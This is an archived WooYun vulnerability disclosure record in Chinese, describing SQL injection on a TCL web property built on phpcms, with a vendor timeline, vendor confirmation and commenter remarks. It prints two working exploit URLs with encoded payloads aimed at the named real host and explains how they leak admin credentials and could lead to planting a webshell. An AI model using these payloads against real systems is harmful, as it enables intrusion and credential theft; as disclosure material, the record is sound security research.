{"id": 53829, "wybug_id": "wooyun-2014-066366", "wybug_title": "TCL某站SQL注入一枚", "wybug_corp": "TCL官方网上商城", "wybug_author": "sql", "wybug_date": "2014-06-27 17:41", "wybug_open_date": "2014-08-11 17:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向公众公开  简要描述： TCL某站SQL注入一枚趁世界杯没开始 稍微又看了下。 详细说明：  前面是猜到一个黑客的 webshell。因此肯定有很明显的漏洞，所以就趁世界杯没开始 稍微看了下。http://bit.tcl.com/该站发现用的是phpcms。因为配置文件末默认的uc_key是空。因此可以进行sql注入。执行：http://bit.tcl.com/phpsso_server/api/uc.php?code=17e6zArAIfR6iqzq592JgVl0r4K%2B%2BgukWcWso8N2As8wG%2Fh6bWh0HG%2BnkIJGBy2BYdhahpbohC6sCiW210k9Kq%2FSj%2F4%2BrWr0E9qqqTjLoTdGtJzTxExL0%2BnwK6KO0NkNL1OneyXIc%2BsOCrt6zBAcnsu%2Bolqdq1nHNulr861WhdO4Gw4zxyqOZW03zIV1fQplEV35U4iJ8aE\n\nhttp://bit.tcl.com/phpsso_server/api/uc.php?code=c083du8enogt4QbzvHeM8GbShlbtSbr1V0dDABJcdgCOpa%2Fx15lsCqVq8oKorQoUixsoWalIzsxW6%2FjaHsMSWVZSqhKwXTYjAgFX5JlMGVsM6YmEVWHoNXNoa%2FyNgIRDDHT0H8Vl64GgbsO%2FFT2sQE%2F5ZsQzwwBrybF5kaT%2B3ddNPaHQucnbqNIkBUdOaiBgyNMaxO%2Fd31t0gd7BePoQWAxF76yLx0As6cy8wDUvQ%2BWPlov85G70%2FVvfKzrg3gTQRNMvLgay\n\n这样就爆出了 后台管理员的账号密码。那么就可以http://bit.tcl.com/index.php?m=admin&c=index&a=login&pc_hash=进后台拿shell了。当然用过这种加密sql语句的方式 可以执行任意sql。如果mysql权限够大 只可以直接导出一个shell。经测试该站是root跑的很容易可以导出shell啦。  就不抓图了。   漏洞证明：  同上   修复方案：  用最新版的吧。   版权声明：转载请注明来源 sql@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-28 09:13 厂商回复： 感谢您的关注，已转交相关单位处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-27 17:49 |    \t\teval \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:23        | 专注小厂商五十年。)\t\t \n  为什么他这个可以首页，我那个打包都没首页？    \n     2014-06-29 18:53 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @eval 潜规则    \n     2014-06-30 12:42 |    \t\tsql  \t\t\t( 核心白帽子 |\t\t\t        Rank:1127 漏洞数:145        | 带着两个MM（mysql,mssql），玩3p（asp,php...)\t\t \n  @eval 你哪里看到首页了？ 只给了4分    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}